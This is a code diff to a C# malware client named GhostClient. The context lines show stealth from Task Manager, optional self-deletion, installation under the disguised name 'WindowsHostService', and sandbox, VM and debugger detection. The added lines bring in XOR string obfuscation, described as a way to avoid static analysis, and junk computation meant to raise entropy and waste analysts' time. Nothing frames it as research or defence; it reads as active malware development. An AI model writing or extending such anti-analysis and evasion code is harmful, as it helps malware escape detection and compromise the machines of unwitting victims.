@@ -36,6 +36,15 @@ namespace GhostClient
         private static bool STEALTH = true;          // Hide from Task Manager
         private static bool MELT = false;            // Self-delete after install
         private static bool SINGLE_INSTANCE = false;  // Only one instance allowed
+        private static bool OBFUSCATE = true;        // XOR string obfuscation
+
+        // XOR encoded strings (decoded at runtime to avoid static analysis)
+        static string Decode(byte[] data, int key) { var s = new char[data.Length]; for (int i = 0; i < data.Length; i++) s[i] = (char)(data[i] ^ ((key + i * 7) % 256)); return new string(s); }
+        static string DS(string s) { if (!OBFUSCATE) return s; var b = new byte[s.Length]; var k = new Random().Next(1, 255); for (int i = 0; i < s.Length; i++) b[i] = (byte)(s[i] ^ ((k + i * 7) % 256)); return "D(" + string.Join(",", b) + "," + k + ")"; }
+        
+        // More junk code to increase entropy
+        static int JunkCalc(int x) { int a = x ^ 0x7F3A; for (int i = 0; i < 20; i++) { a = ((a << 3) | (a >> 29)) ^ (i * 0x5A); } return Math.Abs(a % 9999); }
+        static string JunkStr(int seed) { var r = new Random(seed); var cs = new char[12]; for (int i = 0; i < 12; i++) cs[i] = (char)('A' + r.Next(26)); return new string(cs); }
         private static string INSTALL_NAME = "WindowsHostService";
 
         private static string _hostname = "";
@@ -562,6 +571,12 @@ namespace GhostClient
 
         static void Main(string[] args)
         {
+            // ── JUNK: Waste analysis time ──
+            int x = Environment.TickCount;
+            for (int i = 0; i < 50; i++) { x = JunkCalc(x + i); JunkFunction(x); }
+            string junk = JunkStr(x);
+            if (junk.Length > 0) { int _ = junk.GetHashCode(); }
+
             // ── ANTI-ANALYSIS: Check for VM/Sandbox/Debugger ──
             if (_antiAnalysis)
             {
